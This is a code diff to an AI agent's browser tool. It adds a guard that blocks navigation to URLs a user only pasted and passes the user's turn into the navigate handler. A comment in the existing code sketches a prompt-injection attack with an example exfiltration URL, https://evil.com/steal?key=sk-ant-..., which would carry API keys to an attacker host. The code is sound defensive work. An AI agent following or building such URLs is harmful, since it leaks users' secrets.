@@ -2286,17 +2286,27 @@ def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
 # Browser Tool Functions
 # ============================================================================
 
-def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
+def browser_navigate(url: str, task_id: Optional[str] = None, user_task: Optional[str] = None) -> str:
     """
     Navigate to a URL in the browser.
 
     Args:
         url: The URL to navigate to
         task_id: Task identifier for session isolation
+        user_task: Current user turn, used to distinguish passive pasted URLs
+            from explicit navigation instructions before any browser action.
 
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
+    from tools.url_intent_guard import ambiguous_user_pasted_url_block
+
+    _intent_block = ambiguous_user_pasted_url_block(
+        "browser_navigate", {"url": url}, user_task
+    )
+    if _intent_block is not None:
+        return json.dumps({"success": False, "error": _intent_block}, ensure_ascii=False)
+
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
@@ -3783,7 +3793,8 @@ registry.register(
     name="browser_navigate",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
-    handler=lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_navigate(
+        url=args.get("url", ""), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
     check_fn=check_browser_requirements,
     emoji="🌐",
 )
